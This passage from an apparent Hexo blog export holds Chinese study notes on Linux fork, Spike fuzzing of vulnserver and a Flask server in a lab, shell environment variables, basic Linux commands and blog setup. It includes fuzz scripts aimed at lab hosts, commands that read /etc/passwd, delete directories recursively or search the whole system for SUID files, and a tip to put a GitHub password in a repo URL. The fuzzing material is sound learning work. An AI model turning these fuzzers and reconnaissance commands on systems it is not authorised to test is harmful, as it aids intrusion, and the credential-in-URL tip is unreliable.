href="https://yq.aliyun.com/articles/333121">https://yq.aliyun.com/articles/333121</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>使用手册</category>
      
      <category>学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hydra</tag>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux fork机制</title>
    <link href="/posts/f55e6f79/"/>
    <url>/posts/f55e6f79/</url>
    
    <content type="html"><![CDATA[<h2 id="1-前导"><a href="#1-前导" class="headerlink" title="1. 前导"></a>1. 前导</h2><ol><li><p>进程可以看做程序的一次执行过程。在linux下，每个进程有唯一的PID标识进程。PID是一个从1到32768的正整数，其中1一般是特殊进程init，其它进程从2开始依次编号。当用完32768后，从2重新开始。</p></li><li><p>linux中有一个叫进程表的结构用来存储当前正在运行的进程。可以使用<code>ps aux</code>命令查看所有正在运行的进程。</p></li><li><p>进程在linux中呈树状结构，init为根节点，其它进程均有父进程，某进程的父进程就是启动这个进程的进程，这个进程叫做父进程的子进程。</p></li><li><p>fork的作用是<strong>复制一个与当前进程一样的进程</strong>。新进程的所有数据（变量、环境变量、程序计数器等）数值都和原进程一致，但是是一个全新的进程，并作为原进程的子进程。</p></li></ol><h3 id="fork函数"><a href="#fork函数" class="headerlink" title="fork函数"></a>fork函数</h3><ul><li>该进程为父进程时，返回子进程的pid</li><li>该进程为子进程时，返回0</li><li>fork执行失败，返回-1</li></ul><p>其实根据名字十分形象，fork叉子分叉：</p><p><img src="/image/Linux_fork%E6%9C%BA%E5%88%B6/fork.png"></p><h2 id="2-例题"><a href="#2-例题" class="headerlink" title="2. 例题"></a>2. 例题</h2><p>在网上看fork机制<a href="https://www.jianshu.com/p/1327c51a4a99">文章</a>中发现一道不错帮助理解的例题，特此记录。</p><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">&#x2F;* 已知从这个程序执行到这个程序的所有进程结束这个时间段内，没有其它新进程执行。1、请说出执行这个程序后，将一共运行几个进程。2、如果其中一个进程的输出结果是“pid1:1001, pid2:1002”，写出其他进程的输出结果（不考虑进程执行顺序）。*&#x2F;int mian()&#123;pid_t pid1;pid_t pid2;pid1 &#x3D; fork();pid2 &#x3D; fork();printf(&quot;pid1:%d,pid2:%d\n&quot;,pid1,pid2);&#125;</code></pre></div><h3 id="2-1-解题关键"><a href="#2-1-解题关键" class="headerlink" title="2.1 解题关键"></a>2.1 解题关键</h3><p>解题的关键就是要认识到fork将程序切成两段。看下图：</p><p><img src="/image/Linux_fork%E6%9C%BA%E5%88%B6/ex.png"></p><p> 上图表示一个含有fork的程序，而fork语句可以看成将程序切为A、B两个部分。然后整个程序会如下运行：</p><ol><li>设由shell直接执行程序，生成了进程P。P执行完Part. A的所有代码。</li><li>当执行到<code>pid = fork();</code>时，P启动一个进程Q，Q是P的子进程，和P是同一个程序的进程。Q继承P的所有变量、环境变量、程序计数器的当前值。</li><li>在P进程中，fork()<strong>将Q的PID返回给变量pid</strong>，并继续执行Part. B的代码。</li><li>在进程Q中，<strong>将0赋给pid</strong>，并继续执行Part. B的代码。</li></ol><p>这里有三个点非常关键:</p><ol><li>P执行了所有程序，而Q只执行了Part. B，即fork()后面的程序。（这是因为Q继承了P的PC-程序计数器）</li><li>Q继承了fork()语句执行时当前的环境，而不是程序的初始环境。</li><li>P中fork()语句启动子进程Q，并将Q的PID返回，而Q中的fork()语句不启动新进程，仅将0返回。</li></ol><h3 id="2-2-解题过程"><a href="#2-2-解题过程" class="headerlink" title="2.2 解题过程"></a>2.2 解题过程</h3><p>下面利用上文阐述的知识进行解题。这里我把两个问题放在一起进行分析。</p><ol><li><p>从shell中执行此程序，启动了一个进程，我们设这个进程为P0，设其PID为XXX（解题过程不需知道其PID）。</p></li><li><p>当执行到pid1 = fork();时，P0启动一个子进程P1，由题目知P1的PID为1001。我们暂且不管P1。</p></li><li><p>P0中的fork返回1001给pid1，继续执行到pid2 = fork();，此时启动另一个新进程，设为P2，由题目知P2的PID为1002。同样暂且不管P2。</p></li><li><p>P0中的第二个fork返回1002给pid2，继续执行完后续程序，结束。所以，P0的结果为“pid1:1001, pid2:1002”。</p></li><li><p>再看P2，P2生成时，P0中pid1=1001，所以P2中pid1继承P0的1001，而作为子进程pid2=0。P2从第二个fork后开始执行，结束后输出“pid1:1001, pid2:0”。</p></li><li><p>接着看P1，P1中第一条fork返回0给pid1，然后接着执行后面的语句。而后面接着的语句是pid2 = fork();执行到这里，P1又产生了一个新进程，设为P3。先不管P3。</p></li><li><p>P1中第二条fork将P3的PID返回给pid2，由预备知识知P3的PID为1003，所以P1的pid2=1003。P1继续执行后续程序，结束，输出“pid1:0, pid2:1003”。</p></li><li><p>P3作为P1的子进程，继承P1中pid1=0，并且第二条fork将0返回给pid2，所以P3最后输出“pid1:0, pid2:0”。</p></li><li><p>至此，整个执行过程完毕。</p></li></ol><h3 id="2-3-所得答案"><a href="#2-3-所得答案" class="headerlink" title="2.3 所得答案"></a>2.3 所得答案</h3><p>   1、一共执行了四个进程。（P0, P1, P2, P3）</p><p>   2、另外几个进程的输出分别为：</p><p>   pid1:1001, pid2:0</p><p>   pid1:0, pid2:1003</p><p>   pid1:0, pid2:0</p><blockquote><p>参考：</p><p><a href="https://www.jianshu.com/p/1327c51a4a99">https://www.jianshu.com/p/1327c51a4a99</a></p><p><a href="https://zhuanlan.zhihu.com/p/36872365">https://zhuanlan.zhihu.com/p/36872365</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>fork</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Spike简单测试使用</title>
    <link href="/posts/c0dbeb78/"/>
    <url>/posts/c0dbeb78/</url>
    
    <content type="html"><![CDATA[<blockquote><p>之前了解了一下Spike模糊测试框架，本文记录一下使用过程中遇到的问题与使用测试结果。</p></blockquote><h2 id="1-编译问题"><a href="#1-编译问题" class="headerlink" title="1. 编译问题"></a>1. 编译问题</h2><h3 id="macos编译"><a href="#macos编译" class="headerlink" title="macos编译"></a>macos编译</h3><p>使用macos编译出现一些问题，未再考虑。</p><p><img src="/image/Spike%E7%AE%80%E5%8D%95%E6%B5%8B%E8%AF%95%E4%BD%BF%E7%94%A8/lib_mac.png"></p><h3 id="centos编译"><a href="#centos编译" class="headerlink" title="centos编译"></a>centos编译</h3><p>centos编译结果正常，但是运行过程中显示一个库文件<code>libdlrpc.so</code>引用失败。如图：</p><p><img src="/image/Spike%E7%AE%80%E5%8D%95%E6%B5%8B%E8%AF%95%E4%BD%BF%E7%94%A8/lib_linux.png"></p><p>根据查找，运行<code>src</code>下<code>ld.sh</code>脚本导入环境变量解决。</p><p>注：通过<code>source ld.sh</code>或<code>. ./ld.sh</code>运行，通过<code>./ld.sh</code>则无法解决。原因参见<a href="https://leex0.top/2020/08/11/shell%E8%84%9A%E6%9C%AC%E8%AE%BE%E7%BD%AE%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%97%AE%E9%A2%98/">此文章</a>。</p><p><code>ld.sh</code>如下：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">#Use this to use any of the generic programs#try using . .&#x2F;ld.sh if it&#39;s not workingexport LD_LIBRARY_PATH&#x3D;.</code></pre></div><h2 id="2-vulnserver程序测试"><a href="#2-vulnserver程序测试" class="headerlink" title="2. vulnserver程序测试"></a>2. vulnserver程序测试</h2><p>通过使用vulnserver，测试spike能否正确使用。</p><p>脚本如下：</p><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">s_readline();s_string(&quot;TRUN&quot;);s_string_variable(&quot;COMMAND&quot;);</code></pre></div><p>攻击端（CentOS）<code>./generic_send_tcp 10.xx.xx.xx 9999 vul_test.spk 0 0</code>：</p><p><img src="/image/Spike%E7%AE%80%E5%8D%95%E6%B5%8B%E8%AF%95%E4%BD%BF%E7%94%A8/vul_fuzz.png"></p><p>服务器端（WindowsXP）程序崩溃：</p><p><img src="/image/Spike%E7%AE%80%E5%8D%95%E6%B5%8B%E8%AF%95%E4%BD%BF%E7%94%A8/vul_error.png"></p><h2 id="3-flask-web测试"><a href="#3-flask-web测试" class="headerlink" title="3. flask web测试"></a>3. flask web测试</h2><p>搭建一个简单的web服务器(<code>python flask</code>)测试spike使用。</p><p>攻击脚本如下：</p><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">s_string(&quot;GET &#x2F; HTTP&#x2F;1.1\r\n&quot;);s_string(&quot;Host: 10.37.129.5:5000\r\n&quot;);s_string(&quot;User-Agent: &quot;);s_string(&quot;Content-Length: &quot;);s_blocksize_string(&quot;block1&quot;, 5); s_string(&quot;\r\nConnection: close\r\n\r\n&quot;);s_block_start(&quot;block1&quot;);s_string(&quot;inputvar&#x3D;&quot;);s_block_end(&quot;block1&quot;);</code></pre></div><p>攻击端（CentOS）<code>./generic_send_tcp 10.37.129.5 5000 flask.spk 0 0</code>：</p><p><img src="/image/Spike%E7%AE%80%E5%8D%95%E6%B5%8B%E8%AF%95%E4%BD%BF%E7%94%A8/flask_fuzz.png"></p><p>服务器端（Ubuntu）：</p><p><img src="/image/Spike%E7%AE%80%E5%8D%95%E6%B5%8B%E8%AF%95%E4%BD%BF%E7%94%A8/flask_run.png"></p>]]></content>
    
    
    <categories>
      
      <category>项目组</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Spike</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shell脚本设置环境变量问题</title>
    <link href="/posts/74cee2a8/"/>
    <url>/posts/74cee2a8/</url>
    
    <content type="html"><![CDATA[<blockquote><p>在编写框架的初始化编译脚本的过程中，需要向系统导入一个环境变量。</p><p>期望导入<code>LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$path</code></p><p>使用<code>sh init.sh</code>后，发现环境变量并未导入。</p></blockquote><p>脚本内容简单，如下：</p><div class="code-wrapper"><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">.&#x2F;configure &amp;&amp; make clean &amp;&amp; makepath&#x3D;$(pwd)LD_LIBRARY_PATH&#x3D;$LD_LIBRARY_PATH:$pathexport LD_LIBRARY_PATHldconfig</code></pre></div><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><ul><li>使用<code>source init.sh</code>可以解决问题（具有权限情况下）。</li></ul><h2 id="问题原因"><a href="#问题原因" class="headerlink" title="问题原因"></a>问题原因</h2><ul><li><p>使用 <code>sh</code> 命令来执行shell脚本的时候，脚本实际是在<code>sh</code>创建的子shell中执行。</p></li><li><p>所以当<code>sh</code>进程完成的时候并没有修改系统变量，所以通过执行 <code>sh init.sh </code>来修改系统变量是无效的。</p></li></ul><h3 id="Q1-父子Shell-与-环境变量"><a href="#Q1-父子Shell-与-环境变量" class="headerlink" title="Q1. 父子Shell 与 环境变量"></a>Q1. 父子Shell 与 环境变量</h3><ul><li>执行程序通常可以理解为parent process所产生的child process，child执行完后再返回到parent。这一现象在Linux中成为<code>fork</code>。子进程产生时会从父进程处<strong>获得资源分配与继承环境</strong>，<strong>所谓环境变量其实就是会传给子进程的变量</strong>。</li><li>通常是，<strong>子shell会继承所有父shell的变量</strong>（可以直接引用）。父shell的变量包括<strong>所有export导出的环境变量和当前环境下设置的变量</strong>（形如var=value）的命令。</li><li>从 process 的观念来看，是 <strong>parent process 产生一个 child process 去执行</strong>，当 child 结束后，会返回 parent ，但 parent 的环境是不会因 child 的改变而改变的。</li></ul><h3 id="Q2-source-与-sh-与-xxx-执行脚本的区别"><a href="#Q2-source-与-sh-与-xxx-执行脚本的区别" class="headerlink" title="Q2. source(.) 与 sh 与 ./xxx 执行脚本的区别"></a>Q2. source(.) 与 sh 与 ./xxx 执行脚本的区别</h3><ul><li><p>对于脚本xxx.sh来说，<code>. ./xxx.sh</code>与<code>source ./xxx.sh</code>相同，与<code>./xxx.sh</code>和<code>sh xxx.sh</code>均不同。</p></li><li><p><code>./xxx.sh</code>——首先你会查找脚本第一行是否指定了解释器，如果没指定，那么就用当前系统默认的shell(大多数linux默认是bash)，如果指定了解释器，那么就将该脚本交给指定的解释器。</p></li><li><p><code>sh xxx.sh</code>——表示我使用sh来解释这个脚本，可以不要执行权限。</p></li><li><p>正常来说，当我们执行一个 shell script 时，其实是先<strong>产生一个 sub-shell 的子进程</strong>，然后 sub-shell 再去产生命令行的子进程。（<code>sh</code>执行脚本的一般方式）</p></li><li><p>所谓<code>source</code>就是让 script 在<strong>当前 shell 内执行而不是产生一个 sub-shell 来执行</strong>。<br>由于所有执行结果均于当前 shell 内完成，若 script 的环境有所改变，当然也会改变当前环境。<br><em>可以理解为source是把脚本内容一行一行读到父shell里挨着执行。</em></p></li></ul><blockquote><p>参考：</p><p><a href="http://bbs.chinaunix.net/thread-2211666-1-1.html">http://bbs.chinaunix.net/thread-2211666-1-1.html</a></p><p><a href="https://www.zhihu.com/question/41441630/answer/91061860">https://www.zhihu.com/question/41441630/answer/91061860</a>  - Virtual的回答</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>Shell</tag>
      
      <tag>环境变量</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>模糊测试与Spike框架简介</title>
    <link href="/posts/2a175e95/"/>
    <url>/posts/2a175e95/</url>
    
    <content type="html"><![CDATA[<h2 id="1-内容介绍"><a href="#1-内容介绍" class="headerlink" title="1. 内容介绍"></a>1. 内容介绍</h2><h3 id="1-1-模糊测试简介"><a href="#1-1-模糊测试简介" class="headerlink" title="1.1 模糊测试简介"></a>1.1 模糊测试简介</h3><p>模糊测试（Fuzzing），是一种通过向目标系统提供非预期的输入并监视异常结果来发现软件漏洞的方法。<br>其核心思想是自动或半自动的生成随机数据输入到一个程序中，并监控目标程序异常，如崩溃，断言(assertion)失败，以发现可能的程序错误，比如内存泄漏等。<br>即用随机坏数据（也称做 fuzz）攻击一个程序，然后等着观察哪里遭到了破坏。但这一过程却能揭示出程序中的重要 bug。<br>它是一种介于完全的手工渗透测试与完全的自动化测试之间的安全性测试类型。它充分利用了机器能够随机生成和发送数据的能力。</p><h3 id="1-2-Spike框架"><a href="#1-2-Spike框架" class="headerlink" title="1.2 Spike框架"></a>1.2 Spike框架</h3><p>Spike是一个模糊器创建工具包，它提供了API，允许用户基于网络的协议来创建自己的fuzzer。其中包含一些通用的模糊测试器。</p><h3 id="1-3-网络协议模糊测试"><a href="#1-3-网络协议模糊测试" class="headerlink" title="1.3 网络协议模糊测试"></a>1.3 网络协议模糊测试</h3><p>对网络协议进行模糊测试也需要识别出可被攻击的接口，通过变异或生成方式得到能够触发错误的模糊测试值，然后将这些模糊测试值发送给目标应用，监视目标应用的错误。</p><h2 id="2-基本过程"><a href="#2-基本过程" class="headerlink" title="2. 基本过程"></a>2. 基本过程</h2><ul><li>确定测试的目标</li><li>确定输入的向量</li><li>生成模糊测试数据，可由测试工具通过随机或是半随机的方式生成</li><li>执行模糊数据测试</li><li>监视异常</li><li>判定发现的漏洞是否可能被利用</li></ul><h2 id="3-测试方法分类"><a href="#3-测试方法分类" class="headerlink" title="3. 测试方法分类"></a>3. 测试方法分类</h2><ul><li>基于<code>变异</code>的模糊测试——简而言之就是正常调用协议，抓包，然后混淆数据包达到生成异常数据包的结果，从而进行测试。</li></ul><blockquote><p>这种方法对已有的正常数据集依赖较高。需要有足够丰富的合法输入从而产生足够丰富的测试类型。</p></blockquote><p>例如，png图片除了文件头后面数据内容进行置换混淆得到异常测试数据。</p><p><img src="/image/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E4%B8%8ESpike%E6%A1%86%E6%9E%B6%E7%AE%80%E4%BB%8B/png1.png"></p><ul><li>基于<code>生成</code>的模糊测试——简而言之就是理解协议规约定义，创建文法自动生成动态模糊的测试用例。</li></ul><blockquote><p>这种方法对协议的理解掌握程度需求更高。难度更大。</p></blockquote><p>http的post请求如图，其中fuzzable的点可用来生成测试例子。</p><p><img src="/image/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E4%B8%8ESpike%E6%A1%86%E6%9E%B6%E7%AE%80%E4%BB%8B/http-post.png"></p><p><img src="/image/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E4%B8%8ESpike%E6%A1%86%E6%9E%B6%E7%AE%80%E4%BB%8B/http-fuzz.png"></p><h2 id="4-困难点"><a href="#4-困难点" class="headerlink" title="4. 困难点"></a>4. 困难点</h2><p>协议分析，对于特定的程序与配套协议，需要对程序段进行逆向分析才能得到<br>协议内容以创建测试样例，而其中逆向分析工作难度与工作量都较大。</p>]]></content>
    
    
    <categories>
      
      <category>项目组</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Spike</tag>
      
      <tag>模糊测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux基础知识复习(1)--基本命令</title>
    <link href="/posts/331f8832/"/>
    <url>/posts/331f8832/</url>
    
    <content type="html"><![CDATA[<p>很久没有使用Linux，基础知识也忘了不少。</p><p>找了本<a href="https://www.linuxprobe.com/docs/LinuxProbe.pdf">参考书</a>顺带复习一下Linux的部分基础知识。</p><h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><h3 id="常用工作命令"><a href="#常用工作命令" class="headerlink" title="常用工作命令"></a>常用工作命令</h3><ul><li><p><code>echo</code>：用于在终端输出字符串或变量提取后的值</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ echo Hello!Hello!$ echo $SHELL&#x2F;bin&#x2F;bash</code></pre></div></li><li><p><code>reboot</code>：重启系统</p></li><li><p><code>poweroff</code>：关闭系统</p></li><li><p><code>wget</code>：下载网络文件</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ wget http:&#x2F;&#x2F;www.linuxprobe.com&#x2F;docs&#x2F;LinuxProbe.pdf</code></pre></div></li><li><p><code>ps</code>：查看系统中的进程状态</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ ps -a(all) -u(user)</code></pre></div></li><li><p><code>top</code>：动态地监视进程活动与系统负载等信息</p></li><li><p><code>pidof</code>：查询某个指定服务进程的 PID 值</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ pidof sshd23587 798</code></pre></div></li><li><p><code>kill</code>：终止某个指定 PID 的服务进程</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ kill 23587</code></pre></div></li><li><p><code>killall</code>：终止某个指定名称的服务所对应的全部进程</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ killall sshd</code></pre></div></li></ul><h3 id="系统状态命令"><a href="#系统状态命令" class="headerlink" title="系统状态命令"></a>系统状态命令</h3><ul><li><code>ifconfig</code>：用于获取网卡配置与网络状态等信息</li><li><code>uname</code>：用于查看系统内核与系统版本等信息 -a</li><li><code>free</code>：用于显示当前系统中内存的使用量信息</li><li><code>who</code>：用于查看当前登入主机的用户终端信息(whoami)</li><li><code>history</code>：用于显示历史执行过的命令（清除 -c）</li></ul><h3 id="目录切换命令"><a href="#目录切换命令" class="headerlink" title="目录切换命令"></a>目录切换命令</h3><ul><li><code>pwd</code>：显示用户当前所处的工作目录</li><li><code>cd</code>：切换工作路径</li><li><code>ls</code>：显示目录中文件信息（所有文件-a，详细信息-l）</li></ul><h3 id="文件编辑命令"><a href="#文件编辑命令" class="headerlink" title="文件编辑命令"></a>文件编辑命令</h3><ul><li><p><code>cat</code>：查看纯文本文件（较少）</p></li><li><p><code>more </code>：查看纯文本文件（较多）</p></li><li><p><code>head</code>：查看纯文本文档的前 n行</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ head -n 20 &#x2F;etc&#x2F;passwd</code></pre></div></li><li><p><code>tail</code>：查看纯文本文档的后 N 行或持续刷新内容</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ tail -n 20 &#x2F;etc&#x2F;passwd$ tail -f &#x2F;var&#x2F;log&#x2F;message</code></pre></div></li><li><p><code>tr</code>：替换文本文件中的字符</p>  <div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ cat anaconda-ks.cfg | tr [a-z] [A-Z]</code></pre></div></li><li><p><code>wc</code>：统计指定文本的行数-l、字数-w、字节数-c</p>  <div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ wc -l &#x2F;etc&#x2F;passwd</code></pre></div></li><li><p><code>stat</code>：查看文件的具体存储信息和时间等信息</p>  <div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ stat &#x2F;etc&#x2F;passwd</code></pre></div></li><li><p><code>diff</code>：比较多个文本文件的差异</p>  <div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ diff diff_a.txt diff_b.txt</code></pre></div></li></ul><h3 id="目录管理命令"><a href="#目录管理命令" class="headerlink" title="目录管理命令"></a>目录管理命令</h3><ul><li><p><code>touch</code>：创建空白文件或设置文件的时间</p>  <div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ touch touch_a.txt</code></pre></div></li><li><p><code>mkdir</code>：创建空白目录</p>  <div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ mkdir ~&#x2F;mkdir_a</code></pre></div></li><li><p><code>cp</code>：用于复制文件和目录</p>  <div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ cp install.log x.log$ cp -r &#x2F;etc ~&#x2F;mkdir_a </code></pre></div></li><li><p><code>mv</code>：剪切文件或将文件重命名</p>  <div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ mv x.log linux.log</code></pre></div></li><li><p><code>rm</code>：删除文件或目录</p>  <div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ rm -f install.log$ rm -rf ~&#x2F;mkdir_a</code></pre></div></li><li><p><code>dd</code>：按照指定大小和个数的数据块来复制文件或转换文件</p>  <div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ dd if&#x3D;&#x2F;dev&#x2F;zero of&#x3D;560_file count&#x3D;1 bs&#x3D;560M# if为输入文件，of为输出文件，count为块数 bs为每个块大小1+0 records in1+0 records out587202560 bytes (587 MB, 560 MiB) copied, 3.49432 s, 168 MB&#x2F;s</code></pre></div></li><li><p><code>file</code>：查看文件的类型</p>  <div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ file 560_file560_file: data</code></pre></div></li></ul><h3 id="压缩搜索命令"><a href="#压缩搜索命令" class="headerlink" title="压缩搜索命令"></a>压缩搜索命令</h3><ul><li><p><code>tar</code>：对文件进行打包压缩或解压</p>  <div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ tar -czvf etc.tar.gz &#x2F;etc# 压缩$ tar -xzvf etc.tar.gz -C &#x2F;root&#x2F;etc # 解压</code></pre></div></li><li><p><code>grep</code>：在文本中执行关键词搜索，并显示匹配的结果</p>  <div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ grep &#x2F;sbin&#x2F;nologin &#x2F;etc&#x2F;passwd# -n 显示行号； -v 反选信息</code></pre></div></li><li><p><code>find</code>：按照指定条件来查找文件</p>  <div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ find &#x2F;etc -name &quot;host*&quot; -print# 获取到&#x2F;etc中所有以 host 开头的文件列表$ find &#x2F; -perm -4000 -print# 在整个系统中搜索权限中包括 SUID 权限的所有文件$ find &#x2F; -user linuxprobe -exec cp -a &#123;&#125; &#x2F;root&#x2F;findresults&#x2F; \;# 在整个文件系统中找出所有归属于 linuxprobe 用户的文件并复制到&#x2F;root&#x2F;findresults 目录# 命令的结尾必须是“\;”！！！</code></pre></div></li></ul>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>搭建Hexo个人博客</title>
    <link href="/posts/25ad3a99/"/>
    <url>/posts/25ad3a99/</url>
    
    <content type="html"><![CDATA[<p><a href="https://hexo.io/zh-cn/">Hexo</a>是一个快速、简洁且高效的博客框架。</p><p>Hexo主题较多，使用也比较方便，搭建一个博客记录生活学习。</p><p>环境搭建比较简单，记录一下中间遇到的小问题和主题的设置。</p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul><li>下载安装node.js（建议安装10.0版本以上）</li><li>下载安装git</li><li>下载安装hexo， <code>npm install -g hexo</code> （建议终端走代理）</li></ul><h3 id="本地搭建测试"><a href="#本地搭建测试" class="headerlink" title="本地搭建测试"></a>本地搭建测试</h3><ul><li>本地创建一个文件夹，如xxxblog</li><li>bash中切换到xxxblog目录下，输入 <code>hexo init</code></li><li>运行<code>hexo s</code>打开服务</li><li>本地localhost:4000上应该有博客的基本模板，本地搭建完成</li></ul><h3 id="关联git"><a href="#关联git" class="headerlink" title="关联git"></a>关联git</h3><ul><li>git与本地连接</li></ul><p>绑定信息：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ git config --global user.name &quot;你的GitHub用户名&quot;$ git config --global user.email &quot;你的GitHub绑定的邮箱&quot;</code></pre></div><p>然后生成密钥SSH key：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ ssh-keygen -t rsa -C &quot;你的GitHub绑定的邮箱&quot;</code></pre></div><p>获取生成的密钥信息放入GitHub-&gt;Settings-&gt;SSH and GPG keys：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ cat ~&#x2F;.ssh&#x2F;id_rsa.pub</code></pre></div><ul><li>git与博客绑定</li></ul><p>在Github上创建名字为<code>xxx,github.io</code>的项目，xxx为你的GitHub用户名，之后均用LeeX0示例。</p><p>打开xxxblog中的_config.yml，将其中的deployment选项的内容改为：</p><div class="code-wrapper"><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">deploy:  type: git  repo:     github: git@github.com:LeeX0&#x2F;LeeX0.github.io.git,master</code></pre></div><p>ps：如果之后推送时显示403错误，将其中的<code>repo: github: git@github.com:LeeX0/LeeX0.github.io.git,master</code></p><p>改为<code>repo: https://GitHub用户名:GitHub密码@github.com/LeeX0/LeeX0.github.io.git</code>尝试</p><ul><li><p>运行<code>npm install hexo-deployer-git –save</code>安装部署工具</p></li><li><p>运行推送</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo clean# clean 清除本地静态文件$ hexo g# generate 生成本地静态文件$ hexo d# deploy 推送部署文件至GitHub</code></pre></div></li><li><p>访问leex0.github.io即可查看博客</p></li></ul><h2 id="博客基本使用"><a href="#博客基本使用" class="headerlink" title="博客基本使用"></a>博客基本使用</h2><ul><li>新建文章</li></ul><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new &quot;postname&quot;# 创建新文章</code></pre></div><p>会在source-&gt;_posts文件夹内生成一个postname.md文件，用markdown格式进行编辑。</p><p>其中front-matter字段主要有：title 文章的标题、date 创建日期 、tags 标签、categories 分类。</p><p>tags 、categories写法建议:</p><div class="code-wrapper"><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">tags: - [tag1]- [tag2]categories:- [cate1]- [cate2-1,cate2-2]</code></pre></div><ul><li>插入图片</li></ul><p>文章插入图片source-&gt;image下，对应文件夹markdown相对路径即可/image/xxx.jpg。</p><ul><li>生成推送</li></ul><p>之后运行推送即可</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo clean# clean 清除本地静态文件$ hexo g# generate 生成本地静态文件$ hexo d# deploy 推送部署文件至GitHub</code></pre></div><h2 id="主题设置"><a href="#主题设置" class="headerlink" title="主题设置"></a>主题设置</h2><p>其中<a href="https://hexo.io/themes/">官网展示的主题</a>已经比较多了，<a href="https://www.zhihu.com/question/24422335">知乎的问答</a>也有比较多推荐。</p><p>我是用的<a href="https://github.com/fluid-dev/hexo-theme-fluid">Fluid</a>主题，介绍一下这个主题的设置。</p><ul><li>下载主题</li></ul><p><a href="https://github.com/fluid-dev/hexo-theme-fluid/archive/v1.8.0.zip">下载</a>最新主题版本，下载后解压到 themes 目录下并重命名为 fluid。</p><ul><li>修改配置</li></ul><p>修改Hexo目录下的<code>_config.yml</code>：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">theme: fluid  # 指定主题Language: zh-CN  # 指定语言，可不改</code></pre></div><p>之后正常生成推送即可，更多设置可参考<a href="https://github.com/fluid-dev/hexo-theme-fluid">文档</a>。</p>]]></content>
    
    
    <categories>
      
      <category>使用手册</category>
      
      <category>学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>blog</tag>
      
      <tag>Hexo</tag>
      
      <tag>Fluid</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
